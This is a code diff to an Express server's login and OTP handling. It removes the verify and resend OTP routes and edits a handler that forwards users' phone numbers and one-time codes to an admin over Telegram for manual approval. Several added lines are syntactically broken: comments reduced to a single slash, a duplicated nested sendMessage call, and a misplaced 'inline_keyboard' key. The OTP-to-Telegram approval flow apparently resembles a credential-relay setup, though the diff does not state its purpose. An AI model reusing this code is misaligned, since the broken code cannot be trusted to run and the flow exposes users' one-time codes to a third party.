@@ -287,7 +287,7 @@ app.post('/api/login', async (req, res) => {
       return res.json({ authenticated: true, status: 'pending', applicationId: row.id, message: 'Your application is awaiting admin approval.' });
     }
 
-    // --- NEW OTP LOGIC ---
+    / --- NEW OTP LOGIC ---
     const otpCode = String(crypto.randomInt(100000, 999999));
     
     await pool.query(
@@ -314,60 +314,7 @@ app.post('/api/login', async (req, res) => {
   }
 });
 
-// VERIFY OTP ROUTE
-
-app.post('/api/verify-otp', async (req, res) => {
-  try {
-    const { applicationId, otpCode } = req.body;
-    const result = await pool.query('SELECT otp_code, otp_status, status, otp_created_at FROM applications WHERE id=$1', [applicationId]);
-    const row = result.rows[0];
-    
-    if (!row) return res.status(404).json({ error: 'Application not found' });
-    if (row.otp_status === 'rejected') return res.status(403).json({ error: 'OTP verification rejected by admin.' });
-    
-    if (row.otp_status !== 'approved') {
-      return res.status(202).json({ error: 'Waiting for admin approval on Telegram...' });
-    }
-
-    const fiveMinsAgo = new Date(Date.now() - 5 * 60000);
-    if (new Date(row.otp_created_at) < fiveMinsAgo) {
-      return res.status(400).json({ error: 'OTP has expired. Please resend.' });
-    }
-    
-    if (row.otp_code !== String(otpCode)) {
-      return res.status(401).json({ error: 'Invalid OTP code.' });
-    }
-    
-    await pool.query(`UPDATE applications SET otp_status='verified', otp_verified_at=NOW() WHERE id=$1`, [applicationId]);
-    return res.json({ success: true, message: 'OTP verified successfully.' });
-  } catch (error) {
-    console.error('OTP Verify Error:', error.message);
-    res.status(500).json({ error: 'Server error during verification.' });
-  }
-});
-
-// RESEND OTP ROUTE
-
-app.post('/api/resend-otp', async (req, res) => {
-  try {
-    const { applicationId } = req.body;
-    const otpCode = String(crypto.randomInt(100000, 999999));
-    const result = await pool.query(
-      `UPDATE applications SET otp_code=$1, otp_status='pending', otp_created_at=NOW() WHERE id=$2 RETURNING phone`,
-      [otpCode, applicationId]
-    );
-    
-    if (!result.rows[0]) return res.status(404).json({ error: 'Not found' });
-    
-    await notifyAdmin(
-      `🔄 OTP RESENT\nApp: ${applicationId}\nPhone: ${result.rows[0].phone}\nOTP: ${otpCode}`,
-      [[{ text: '✅ Approve OTP', callback_data: `otpapprove:${applicationId}` }, { text: '❌ Reject OTP', callback_data: `otpreject:${applicationId}` }]]
-    );
-    res.json({ success: true, message: 'OTP resent to admin.' });
-  } catch (error) {
-    res.status(500).json({ error: 'Could not resend OTP.' });
-  }
-});
+/ VERIFY OTP ROUTE
 
 // CHECK APPLICATION STATUS
 
@@ -504,7 +451,7 @@ async function processTelegramUpdate(update) {
 
   if (callback) {
     const match = /^(approve|reject|pinapprove|pinreject|otpapprove|otpreject):([0-9a-f-]{36})$/i.exec(callback.data || '');
-
+    
     if (!match) {
       await telegramApi('answerCallbackQuery', { callback_query_id: callback.id, text: 'Unknown action.' }).catch(() => {});
       return;
@@ -591,16 +538,18 @@ app.post('/api/verify-otp', async (req, res) => {
     
     try {
         await telegramApi('sendMessage', {
-            chat_id: CHAT_ID, 
+            await telegramApi('sendMessage', {
+    chat_id: ADMIN_CHAT_ID,
             text: message,
             parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [
-                    [
-                        { text: "✅ Approve OTP", callback_data: `approve_otp_${phone}` },
-                        { text: "❌ Reject OTP", callback_data: `reject_otp_${phone}` }
-                    ]
-                ]
+                    inline_keyboard: [
+    [
+        { text: "✅ Approve OTP", callback_data: `otpapprove:${phone}` }, 
+        { text: "❌ Reject OTP", callback_data: `otpreject:${phone}` }
+    ]
+]
             }
         });
     } catch (error) {
